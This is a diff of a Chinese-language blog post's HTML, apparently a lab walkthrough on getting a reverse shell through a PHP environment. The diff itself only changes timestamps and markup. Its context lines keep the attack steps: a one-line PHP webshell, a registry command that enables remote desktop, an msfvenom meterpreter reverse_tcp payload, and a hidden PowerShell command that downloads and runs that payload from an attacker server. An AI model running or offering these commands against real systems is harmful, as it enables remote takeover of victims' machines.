@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershellbase64.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/duominuo.png">
 <meta property="article:published_time" content="2020-01-13T03:38:16.000Z">
-<meta property="article:modified_time" content="2020-01-14T01:51:40.312Z">
+<meta property="article:modified_time" content="2020-01-14T02:39:06.220Z">
 <meta property="article:author" content="breakonion">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91%E5%9B%BE.png">
@@ -324,10 +324,10 @@
 <h3 id="①环境配置"><a href="#①环境配置" class="headerlink" title="①环境配置"></a>①环境配置</h3><p>　　1. 启用受害机的PHPstudy环境。</br><br>　　2. 攻击机器带hackbar(能提交POST请求的工具都可以)的firefox </br><br>　　3. 安装有metasploit的PC（这里选了kali linux）</br></p>
 <h3 id="②开始排练"><a href="#②开始排练" class="headerlink" title="②开始排练"></a>②开始排练</h3><p>　　1. 武器构建</br><br>　　前边已经说了，我要用PHP环境调用powershell。那么该怎么调用呢？在调用powershell之前，我还希望通过一些远程命令来关掉目标的防火墙。所以我们要逐层突防，不要太急功近利。所以此处先掏出”大杀器”通过特殊处理的一句话木马,让管理员放松警惕，觉得你是个小垃圾。<?php system($_POST["onino"]);?>,虽然它很短，但是我觉得它很容易就被变形和隐藏。参见<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener" title="无字母和数字的webshell">https://www.freebuf.com/articles/web/186298.html</a>。此处很单纯的一句话和一个hackbar就可以完成数据传输（此处还有提升空间，采取加密通信！）远程开启和关闭windows的防火墙,开启3389端口。<br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/muma.png" alt=""></p>
 <pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f /*开启3389端口*/</code></pre> 
-<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/3389.png" alt=""><br>　　以上就是通过简单的命令配合一句话木马达到控制远端受害机器的防火墙、3389端口等策略。接下来就可以采取多种策略和攻击方式做下一步工作。比如远程连接3389，直接手工投毒，哈哈哈 当然这样太无趣又乏味了。 我要按照剧本走，通过浏览器发送指令然后，调用powershell发起无文件攻击。<br>　　</br><br>　　首先这里先用metasploit生成攻击载荷,并将此攻击载荷放到攻击载荷服务器的WEB目录下。</p>
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/3389.png" alt=""><br>　　以上就是通过简单的命令配合一句话木马达到控制远端受害机器的防火墙、3389端口等策略。接下来就可以采取多种策略和攻击方式做下一步工作。比如远程连接3389，直接手工投毒，哈哈哈 当然这样太无趣又乏味了。 我要按照剧本走，通过浏览器发送指令然后，调用powershell发起无文件攻击。</br><br>　　首先这里先用metasploit生成攻击载荷,并将此攻击载荷放到攻击载荷服务器的WEB目录下。</p>
 <pre><code>root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.164.143 LPORT=8888 -f psh-reflection >per.ps1
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7.png" alt=""></br><br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/web.png" alt=""><br>　　</br><br>　　这时候侦听的环境都已经准备就绪，并且poweshell要执行的恶意载荷也已经具备，那么该怎么样才能将载荷投递到目标主机呢？既然一句话木马能执行系统命令，那么通过cmd来调用powershell进而让powershell从攻击载荷服务器下载恶意脚本per.ps1并执行就可以了。那么就剩下最关键的一步。剧本假设的是php环境，就得按规矩走，要通过powershell来执行。这当然难不倒我，瞬间我就有了主意构建了武器核心。</p>
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7.png" alt=""></br><br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/web.png" alt=""></br><br>　　这时候侦听的环境都已经准备就绪，并且poweshell要执行的恶意载荷也已经具备，那么该怎么样才能将载荷投递到目标主机呢？既然一句话木马能执行系统命令，那么通过cmd来调用powershell进而让powershell从攻击载荷服务器下载恶意脚本per.ps1并执行就可以了。那么就剩下最关键的一步。剧本假设的是php环境，就得按规矩走，要通过powershell来执行。这当然难不倒我，瞬间我就有了主意构建了武器核心。</p>
 <pre><code>system('cmd /c powershell.exe -sta -W Hidden -c IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.164.147/per.ps1'))');
 </code></pre>
 <p>　　这条命令看起来不错，先在本地尝试执行试试。这时候就会面对PHP环境对于单引号以及双引号的闭合的尴尬。下图中的单引号①号和②号闭合了。③号和④号的字符串直接无效。 我所期望的是希望②号和③号先闭合这样powershell这样Downloadstring后面的url才能被当成字符串执行。 当然把①号和④号换成双引号在编译器执行测试是可以反弹shell的。<br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershell.png" alt=""></br></p>
@@ -370,7 +370,7 @@ echo $encodedCommand</code></pre><p><img src="https://raw.githubusercontent.com/
         <p><span>本文标题:</span><a  href="/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/">用PHP环境调用powershell弹个shell</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 breakonion 的个人博客">breakonion</a></p>
         <p><span>发布时间:</span>2020年01月13日 - 11时38分</p>
-        <p><span>最后更新:</span>2020年01月14日 - 09时51分</p>
+        <p><span>最后更新:</span>2020年01月14日 - 10时39分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/" title="用PHP环境调用powershell弹个shell">http://ljg.dropsec.xyz/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/</a>
             <span class="copy-path" data-clipboard-text="原文: http://ljg.dropsec.xyz/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/　　作者: breakonion" title=""></span>
